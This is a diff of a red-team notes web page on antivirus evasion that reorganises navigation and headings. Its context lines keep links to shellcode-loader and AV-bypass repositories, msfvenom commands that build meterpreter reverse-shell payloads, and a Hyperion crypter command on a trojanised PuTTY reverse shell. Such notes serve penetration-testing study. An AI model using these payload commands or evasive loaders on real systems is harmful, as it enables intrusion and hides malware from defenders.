@@ -23,7 +23,7 @@
     <script src="../../_static/js/theme.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
-    <link rel="next" title="Penetration Testing Overview" href="../../CPTS/Penetration%20Testing%20Overview.html" />
+    <link rel="next" title="Penetration Testing Overview" href="../../CPTS/Reconnaissance/Penetration%20Testing%20Overview.html" />
     <link rel="prev" title="Active Scanning (T5195)" href="../recon/Active%20Scanning.html" /> 
 </head>
 
@@ -58,26 +58,23 @@
 <li class="toctree-l2"><a class="reference internal" href="#manual-loader">Manual loader</a><ul>
 <li class="toctree-l3"><a class="reference internal" href="#reminder">Reminder</a></li>
 <li class="toctree-l3"><a class="reference internal" href="#go">Go</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#c-1">C</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#c-2">C++</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#net">.NET</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#ruby">Ruby</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#c-1">C</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#c-2">C++</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#net">.NET</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#ruby">Ruby</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#automatic-loader">Automatic loader</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#c-c">C++/C</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#c-3">C</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#nim">Nim</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#go-1">Go</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#rust">Rust</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#crystal">Crystal</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#crystal">Crystal</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#generate-shellcode">Generate shellcode</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#msfvenom">msfvenom</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#c2-cobalt-havoc-what-ever">C2 (Cobalt/Havoc what ever)</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#asm">ASM</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#hyperion">Hyperion</a></li>
 </ul>
 </li>
-<li class="toctree-l2"><a class="reference internal" href="#generate-shellcode">Generate shellcode</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#msfvenom">msfvenom</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#c2-cobalt-havoc-what-ever">C2 (Cobalt/Havoc what ever)</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#asm">ASM</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#hyperion">Hyperion</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#manual-obfuscation">Manual obfuscation</a><ul>
@@ -133,17 +130,62 @@
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Footprinting.html">Footprinting</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Host%20Enumeration.html">Host Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Reconnaissance/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Reconnaissance/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Reconnaissance/Footprinting.html">Footprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Reconnaissance/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Reconnaissance/Host%20Enumeration.html">Host Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Reconnaissance/fingerprinting.html">fingerprinting</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Initial%20Access/File%20Inclusion.html">File Inclusion</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Initial%20Access/Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Pivoting, Tunneling and Port Forwarding</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Tools</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../../tools/dnsenum.html">dnsenum</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../tools/dnsrecon.html">dnsrecon</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../tools/fierce.html">fierce</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Active%20Directory.html">Active Directory</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bash.html">Bash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bettercap.html">bettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Bitlocker.html">Bitlocker</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/bloodhound.py.html">bloodhound.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Certificates.html">Certificates</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cewl.html">cewl</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/chisel.html">chisel</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html">Compliance Standards</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Compliance%20Standards.html#references">References</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crawling.html">crawling</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crowbar.html">crowbar</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/crunch.html">crunch</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/cupp.html">cupp</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/CVSS.html">CVSS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DKIM.html">DKIM</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DMARC.html">DMARC</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/DNS.html">DNS</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/evil-winrm.html">evil-winrm</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fail2ban.html">fail2ban</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/ffuf.html">ffuf</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/fierce.html">fierce</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20on%20Linux.html">File Encryption on Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/File%20Encryption%20Windows.html">File Encryption on Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/finalRecon.html">finalRecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/Firefox%20Decrypt.html">Firefox Decrypt</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/FTP.html">FTP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/git.html">git</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/gobuster.html">gobuster</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hashcat.html">hashcat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/hydra.html">hydra</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/impacket.html">imapacket</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/invoke-TheHash.html">Invoke-TheHash</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html">netstat</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/netstat.html#usage">Usage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/subfinder.html">subfinder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/winrm.html">winrm</a></li>
 </ul>
 
         </div>
@@ -224,31 +266,29 @@
 </div>
 </li>
 </ul>
-</section>
 <section id="c-2">
-<span id="id2"></span><h3>C++<a class="headerlink" href="#c-2" title="Link to this heading"></a></h3>
+<span id="id2"></span><h4>C++<a class="headerlink" href="#c-2" title="Link to this heading"></a></h4>
 <ul class="simple">
 <li><p><a class="reference external" href="https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8">https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8</a></p></li>
 <li><p><a class="reference external" href="https://github.com/ReversingID/Shellcode-Loader/tree/master/windows">https://github.com/ReversingID/Shellcode-Loader/tree/master/windows</a></p></li>
 </ul>
 </section>
 <section id="net">
-<h3>.NET<a class="headerlink" href="#net" title="Link to this heading"></a></h3>
+<h4>.NET<a class="headerlink" href="#net" title="Link to this heading"></a></h4>
 <ul class="simple">
 <li><p><a class="reference external" href="https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/">https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/</a></p></li>
 </ul>
 </section>
 <section id="ruby">
-<h3>Ruby<a class="headerlink" href="#ruby" title="Link to this heading"></a></h3>
+<h4>Ruby<a class="headerlink" href="#ruby" title="Link to this heading"></a></h4>
 <ul class="simple">
 <li><p><a class="reference external" href="https://blog.king-sabri.net/red-team/how-to-execute-raw-shellcode-using-ruby-on-windows-and-linux">https://blog.king-sabri.net/red-team/how-to-execute-raw-shellcode-using-ruby-on-windows-and-linux</a></p></li>
 </ul>
 </section>
 </section>
+</section>
 <section id="automatic-loader">
 <h2>Automatic loader<a class="headerlink" href="#automatic-loader" title="Link to this heading"></a></h2>
-<section id="c-c">
-<h3>C++/C<a class="headerlink" href="#c-c" title="Link to this heading"></a></h3>
 <ul class="simple">
 <li><p><a class="reference external" href="https://github.com/TheD1rkMtr/D1rkLrd">https://github.com/TheD1rkMtr/D1rkLrd</a></p></li>
 <li><p><a class="reference external" href="https://github.com/NtDallas/Ulfberht">https://github.com/NtDallas/Ulfberht</a></p></li>
@@ -259,10 +299,7 @@
 <li><p><a class="reference external" href="https://github.com/TheD1rkMtr/Shellcode-Hide">https://github.com/TheD1rkMtr/Shellcode-Hide</a></p></li>
 <li><p><a class="reference external" href="https://github.com/ProcessusT/Dictofuscation">https://github.com/ProcessusT/Dictofuscation</a></p></li>
 </ul>
-</section>
-<section id="c-3">
-<span id="id3"></span><h3>C<a class="headerlink" href="#c-3" title="Link to this heading"></a></h3>
-<ul class="simple">
+<ul class="simple" id="c-3">
 <li><p><a class="reference external" href="https://github.com/matro7sh/Selha/blob/main/C/aes-loader-stageless.c">https://github.com/matro7sh/Selha/blob/main/C/aes-loader-stageless.c</a></p></li>
 <li><p><a class="reference external" href="https://github.com/cribdragg3r/Alaris">https://github.com/cribdragg3r/Alaris</a></p></li>
 <li><p><a class="reference external" href="https://github.com/trustedsec/COFFLoader">https://github.com/trustedsec/COFFLoader</a></p></li>
@@ -271,19 +308,13 @@
 <li><p><a class="reference external" href="https://github.com/mgeeky/ElusiveMice">https://github.com/mgeeky/ElusiveMice</a></p></li>
 <li><p><a class="reference external" href="https://github.com/boku7/BokuLoader">https://github.com/boku7/BokuLoader</a></p></li>
 </ul>
-</section>
-<section id="nim">
-<h3>Nim<a class="headerlink" href="#nim" title="Link to this heading"></a></h3>
 <ul class="simple">
 <li><p><a class="reference external" href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a></p></li>
 <li><p><a class="reference external" href="https://github.com/sh3d0ww01f/nim_shellloader">https://github.com/sh3d0ww01f/nim_shellloader</a></p></li>
 <li><p><a class="reference external" href="https://github.com/S3cur3Th1sSh1t/Nim-RunPE">https://github.com/S3cur3Th1sSh1t/Nim-RunPE</a></p></li>
 <li><p><a class="reference external" href="https://github.com/xl00t/yetAnotherNimCrypt">https://github.com/xl00t/yetAnotherNimCrypt</a></p></li>
 </ul>
-</section>
-<section id="go-1">
-<span id="id4"></span><h3>Go<a class="headerlink" href="#go-1" title="Link to this heading"></a></h3>
-<ul class="simple">
+<ul class="simple" id="go-1">
 <li><p><a class="reference external" href="https://github.com/matro7sh/myph">https://github.com/matro7sh/myph</a></p></li>
 <li><p><a class="reference external" href="https://github.com/matro7sh/221b">https://github.com/matro7sh/221b</a></p></li>
 <li><p><a class="reference external" href="https://github.com/EddieIvan01/gld">https://github.com/EddieIvan01/gld</a></p></li>
@@ -292,27 +323,20 @@
 <li><p><a class="reference external" href="https://github.com/f1zm0/hades">https://github.com/f1zm0/hades</a></p></li>
 <li><p><a class="reference external" href="https://github.com/D3Ext/Hooka">https://github.com/D3Ext/Hooka</a></p></li>
 </ul>
-</section>
-<section id="rust">
-<h3>Rust<a class="headerlink" href="#rust" title="Link to this heading"></a></h3>
 <ul class="simple">
 <li><p><a class="reference external" href="https://github.com/b1tg/rs_shellcode">https://github.com/b1tg/rs_shellcode</a></p></li>
 <li><p><a class="reference external" href="https://github.com/r4ime/shellcode_loader">https://github.com/r4ime/shellcode_loader</a></p></li>
 <li><p><a class="reference external" href="https://github.com/cr7pt0pl4gu3/Pestilence">https://github.com/cr7pt0pl4gu3/Pestilence</a></p></li>
 <li><p><a class="reference external" href="https://github.com/memN0ps/srdi-rs">https://github.com/memN0ps/srdi-rs</a></p></li>
 </ul>
-</section>
 <section id="crystal">
 <h3>Crystal<a class="headerlink" href="#crystal" title="Link to this heading"></a></h3>
-<ul class="simple">
-<li><p><a class="reference external" href="https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr">https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr</a></p></li>
-</ul>
-</section>
-</section>
+<p><a class="reference external" href="https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr">https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr</a></p>
 <section id="generate-shellcode">
-<h2>Generate shellcode<a class="headerlink" href="#generate-shellcode" title="Link to this heading"></a></h2>
+<h4>Generate shellcode<a class="headerlink" href="#generate-shellcode" title="Link to this heading"></a></h4>
+</section>
 <section id="msfvenom">
-<h3>msfvenom<a class="headerlink" href="#msfvenom" title="Link to this heading"></a></h3>
+<h4>msfvenom<a class="headerlink" href="#msfvenom" title="Link to this heading"></a></h4>
 <ul class="simple">
 <li><p><code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">-p</span> <span class="pre">windows/x64/meterpreter/reverse_tcp</span> <span class="pre">LHOST=&lt;SERVER&gt;</span> <span class="pre">LPORT=&lt;PORT&gt;</span> <span class="pre">-f</span> <span class="pre">raw</span></code></p></li>
 <li><p><code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">-p</span> <span class="pre">windows/meterpreter/reverse_tcp</span> <span class="pre">LHOST=127.0.0.1</span> <span class="pre">--encrypt</span> <span class="pre">rc4</span> <span class="pre">--encrypt-key</span> <span class="pre">thisisakey</span> <span class="pre">-f</span> <span class="pre">dll</span></code></p></li>
@@ -320,19 +344,20 @@
 </ul>
 </section>
 <section id="c2-cobalt-havoc-what-ever">
-<h3>C2 (Cobalt/Havoc what ever)<a class="headerlink" href="#c2-cobalt-havoc-what-ever" title="Link to this heading"></a></h3>
+<h4>C2 (Cobalt/Havoc what ever)<a class="headerlink" href="#c2-cobalt-havoc-what-ever" title="Link to this heading"></a></h4>
 </section>
 <section id="asm">
-<h3>ASM<a class="headerlink" href="#asm" title="Link to this heading"></a></h3>
+<h4>ASM<a class="headerlink" href="#asm" title="Link to this heading"></a></h4>
 <ul class="simple">
 <li><p><a class="reference external" href="https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/">https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/</a></p></li>
 </ul>
 </section>
 <section id="hyperion">
-<h3>Hyperion<a class="headerlink" href="#hyperion" title="Link to this heading"></a></h3>
+<h4>Hyperion<a class="headerlink" href="#hyperion" title="Link to this heading"></a></h4>
 <ul class="simple">
 <li><p><code class="docutils literal notranslate"><span class="pre">wine</span> <span class="pre">hyperion.exe</span> <span class="pre">/root/payloads/shellter/shellter_putty_reverse_x86.exe</span></code></p></li>
 </ul>
+</section>
 </section>
 </section>
 <section id="manual-obfuscation">
@@ -446,7 +471,7 @@ CreateTimerQueueTimer Win32 API</p></li>
 <section id="automatic-obfuscation">
 <h2>Automatic obfuscation<a class="headerlink" href="#automatic-obfuscation" title="Link to this heading"></a></h2>
 <section id="static-1">
-<span id="id5"></span><h3>Static<a class="headerlink" href="#static-1" title="Link to this heading"></a></h3>
+<span id="id3"></span><h3>Static<a class="headerlink" href="#static-1" title="Link to this heading"></a></h3>
 <ul class="simple">
 <li><p>Packing</p>
 <ul>
@@ -500,7 +525,7 @@ CreateTimerQueueTimer Win32 API</p></li>
 </ul>
 </section>
 <section id="dynamic-1">
-<span id="id6"></span><h3>Dynamic<a class="headerlink" href="#dynamic-1" title="Link to this heading"></a></h3>
+<span id="id4"></span><h3>Dynamic<a class="headerlink" href="#dynamic-1" title="Link to this heading"></a></h3>
 <ul class="simple">
 <li><p>Disable ETW</p>
 <ul>
@@ -752,7 +777,7 @@ minimum of 2 GB of RAM and a 100 GB hard drive</p></li>
           </div>
           <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
         <a href="../recon/Active%20Scanning.html" class="btn btn-neutral float-left" title="Active Scanning (T5195)" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
-        <a href="../../CPTS/Penetration%20Testing%20Overview.html" class="btn btn-neutral float-right" title="Penetration Testing Overview" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+        <a href="../../CPTS/Reconnaissance/Penetration%20Testing%20Overview.html" class="btn btn-neutral float-right" title="Penetration Testing Overview" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
     </div>
 
   <hr/>
